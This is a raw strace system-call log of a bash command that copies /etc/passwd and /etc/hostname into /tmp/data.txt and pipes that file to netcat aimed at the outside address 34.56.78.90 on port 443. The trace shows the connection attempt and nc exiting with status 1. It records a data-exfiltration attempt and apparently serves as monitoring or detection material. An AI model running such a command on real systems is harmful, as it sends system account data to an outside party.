10    08:04:33.395618 execve("/usr/bin/bash", ["bash", "-c", "cat /etc/passwd /etc/hostname > "...], 0xfffff7cb4ca0 /* 6 vars */) = 0 <0.000069>
10    08:04:33.395751 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf5c600a9e000 <0.000002>
10    08:04:33.395769 openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3 <0.000003>
10    08:04:33.395790 mmap(NULL, 6888, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf5c600a9c000 <0.000002>
10    08:04:33.395802 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libtinfo.so.6", O_RDONLY|O_CLOEXEC) = 3 <0.000003>
10    08:04:33.395820 mmap(NULL, 325800, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf5c600a19000 <0.000003>
10    08:04:33.395827 mmap(0xf5c600a20000, 260264, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0xf5c600a20000 <0.000004>
10    08:04:33.395849 mmap(0xf5c600a5b000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2b000) = 0xf5c600a5b000 <0.000003>
10    08:04:33.395865 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3 <0.000003>
10    08:04:33.395882 mmap(NULL, 1830504, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf5c600861000 <0.000002>
10    08:04:33.395888 mmap(0xf5c600870000, 1764968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0xf5c600870000 <0.000004>
10    08:04:33.395910 mmap(0xf5c600a0d000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x18d000) = 0xf5c600a0d000 <0.000003>
10    08:04:33.395919 mmap(0xf5c600a13000, 48744, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf5c600a13000 <0.000003>
10    08:04:33.395938 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf5c600a9a000 <0.000002>
10    08:04:33.396047 openat(AT_FDCWD, "/dev/tty", O_RDWR|O_NONBLOCK) = -1 ENXIO (No such device or address) <0.000004>
10    08:04:33.396316 connect(3, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory) <0.000005>
10    08:04:33.396339 connect(3, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory) <0.000003>
10    08:04:33.396361 openat(AT_FDCWD, "/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC) = 3 <0.000002>
10    08:04:33.396396 openat(AT_FDCWD, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 3 <0.000003>
10    08:04:33.396631 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xf5c600a9a0f0) = 11 <0.000025>
11    08:04:33.396771 openat(AT_FDCWD, "/tmp/data.txt", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3 <0.000012>
11    08:04:33.396810 execve("/usr/bin/cat", ["cat", "/etc/passwd", "/etc/hostname"], 0xc0a2ceab0360 /* 6 vars */) = 0 <0.000039>
11    08:04:33.396874 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xe41eacf17000 <0.000002>
11    08:04:33.396887 openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3 <0.000002>
11    08:04:33.396900 mmap(NULL, 6888, PROT_READ, MAP_PRIVATE, 3, 0) = 0xe41eacf15000 <0.000002>
11    08:04:33.396911 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3 <0.000002>
11    08:04:33.396927 mmap(NULL, 1830504, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xe41eacd23000 <0.000002>
11    08:04:33.396934 mmap(0xe41eacd30000, 1764968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0xe41eacd30000 <0.000004>
11    08:04:33.396955 mmap(0xe41eacecd000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x18d000) = 0xe41eacecd000 <0.000002>
11    08:04:33.396963 mmap(0xe41eaced3000, 48744, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xe41eaced3000 <0.000002>
11    08:04:33.397054 openat(AT_FDCWD, "/etc/passwd", O_RDONLY) = 3 <0.000002>
11    08:04:33.397070 mmap(NULL, 139264, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xe41eacd0e000 <0.000002>
11    08:04:33.397100 openat(AT_FDCWD, "/etc/hostname", O_RDONLY) = 3 <0.000003>
11    08:04:33.397167 +++ exited with 0 +++
10    08:04:33.397287 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=11, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
10    08:04:33.398404 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xf5c600a9a0f0) = 12 <0.000032>
12    08:04:33.398769 openat(AT_FDCWD, "/tmp/data.txt", O_RDONLY) = 3 <0.000015>
12    08:04:33.398864 execve("/usr/bin/nc", ["nc", "-w1", "34.56.78.90", "443"], 0xc0a2ceab3450 /* 6 vars */) = 0 <0.000059>
12    08:04:33.398998 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf41ab79c5000 <0.000015>
12    08:04:33.399064 openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3 <0.000016>
12    08:04:33.399138 mmap(NULL, 6888, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf41ab79c3000 <0.000015>
12    08:04:33.399202 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libbsd.so.0", O_RDONLY|O_CLOEXEC) = 3 <0.000019>
12    08:04:33.399299 mmap(NULL, 213024, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf41ab795b000 <0.000015>
12    08:04:33.399332 mmap(0xf41ab7960000, 147488, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0xf41ab7960000 <0.000016>
12    08:04:33.399453 mmap(0xf41ab7982000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x12000) = 0xf41ab7982000 <0.000015>
12    08:04:33.399487 mmap(0xf41ab7984000, 32, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf41ab7984000 <0.000015>
12    08:04:33.399554 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libresolv.so.2", O_RDONLY|O_CLOEXEC) = 3 <0.000017>
12    08:04:33.399654 mmap(NULL, 199104, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf41ab792f000 <0.000015>
12    08:04:33.399687 mmap(0xf41ab7930000, 133568, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0xf41ab7930000 <0.000017>
12    08:04:33.399809 mmap(0xf41ab794d000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xd000) = 0xf41ab794d000 <0.000015>
12    08:04:33.399843 mmap(0xf41ab794f000, 6592, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf41ab794f000 <0.000015>
12    08:04:33.399908 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3 <0.000015>
12    08:04:33.400001 mmap(NULL, 1830504, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf41ab7771000 <0.000014>
12    08:04:33.400033 mmap(0xf41ab7780000, 1764968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0xf41ab7780000 <0.000017>
12    08:04:33.400154 mmap(0xf41ab791d000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x18d000) = 0xf41ab791d000 <0.000018>
12    08:04:33.400190 mmap(0xf41ab7923000, 48744, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf41ab7923000 <0.000016>
12    08:04:33.400256 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libmd.so.0", O_RDONLY|O_CLOEXEC) = 3 <0.000017>
12    08:04:33.400351 mmap(NULL, 172240, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf41ab7755000 <0.000014>
12    08:04:33.400382 mmap(0xf41ab7760000, 106704, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0) = 0xf41ab7760000 <0.000015>
12    08:04:33.400503 mmap(0xf41ab7779000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x9000) = 0xf41ab7779000 <0.000015>
12    08:04:33.400572 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf41ab79c1000 <0.000014>
12    08:04:33.401125 connect(3, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory) <0.000016>
12    08:04:33.401220 connect(3, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory) <0.000015>
12    08:04:33.401343 openat(AT_FDCWD, "/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC) = 3 <0.000015>
12    08:04:33.401531 openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3 <0.000015>
12    08:04:33.401593 mmap(NULL, 6888, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf41ab79c3000 <0.000021>
12    08:04:33.401662 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/tls/aarch64/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000016>
12    08:04:33.401727 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/tls/aarch64/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.401789 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/tls/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.401851 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/tls/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.401913 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/aarch64/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000015>
12    08:04:33.401976 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/aarch64/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.402037 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000015>
12    08:04:33.402100 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000015>
12    08:04:33.402163 openat(AT_FDCWD, "/usr/lib/aarch64-linux-gnu/tls/aarch64/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000015>
12    08:04:33.402225 openat(AT_FDCWD, "/usr/lib/aarch64-linux-gnu/tls/aarch64/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.402286 openat(AT_FDCWD, "/usr/lib/aarch64-linux-gnu/tls/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.402348 openat(AT_FDCWD, "/usr/lib/aarch64-linux-gnu/tls/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.402409 openat(AT_FDCWD, "/usr/lib/aarch64-linux-gnu/aarch64/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.402470 openat(AT_FDCWD, "/usr/lib/aarch64-linux-gnu/aarch64/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.402531 openat(AT_FDCWD, "/usr/lib/aarch64-linux-gnu/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.402592 openat(AT_FDCWD, "/usr/lib/aarch64-linux-gnu/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000020>
12    08:04:33.402660 openat(AT_FDCWD, "/lib/tls/aarch64/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000015>
12    08:04:33.402722 openat(AT_FDCWD, "/lib/tls/aarch64/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.402784 openat(AT_FDCWD, "/lib/tls/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.402845 openat(AT_FDCWD, "/lib/tls/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.402908 openat(AT_FDCWD, "/lib/aarch64/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000016>
12    08:04:33.402971 openat(AT_FDCWD, "/lib/aarch64/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.403032 openat(AT_FDCWD, "/lib/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000015>
12    08:04:33.403094 openat(AT_FDCWD, "/lib/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000015>
12    08:04:33.403158 openat(AT_FDCWD, "/usr/lib/tls/aarch64/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.403219 openat(AT_FDCWD, "/usr/lib/tls/aarch64/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.403280 openat(AT_FDCWD, "/usr/lib/tls/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.403342 openat(AT_FDCWD, "/usr/lib/tls/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.403404 openat(AT_FDCWD, "/usr/lib/aarch64/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.403465 openat(AT_FDCWD, "/usr/lib/aarch64/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.403526 openat(AT_FDCWD, "/usr/lib/atomics/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.403587 openat(AT_FDCWD, "/usr/lib/libnss_db.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000019>
12    08:04:33.403688 openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3 <0.000015>
12    08:04:33.403755 mmap(NULL, 6888, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf41ab79c3000 <0.000015>
12    08:04:33.403818 openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libnss_db-2.35.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000016>
12    08:04:33.403853 openat(AT_FDCWD, "/usr/lib/aarch64-linux-gnu/libnss_db-2.35.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000015>
12    08:04:33.403886 openat(AT_FDCWD, "/lib/libnss_db-2.35.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000015>
12    08:04:33.403920 openat(AT_FDCWD, "/usr/lib/libnss_db-2.35.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000014>
12    08:04:33.403984 openat(AT_FDCWD, "/etc/services", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) <0.000016>
12    08:04:33.404114 connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("34.56.78.90")}, 16) = -1 EINPROGRESS (Operation now in progress) <0.000088>
12    08:04:34.409920 +++ exited with 1 +++
10    08:04:34.410564 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=12, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
10    08:04:34.411838 +++ exited with 0 +++
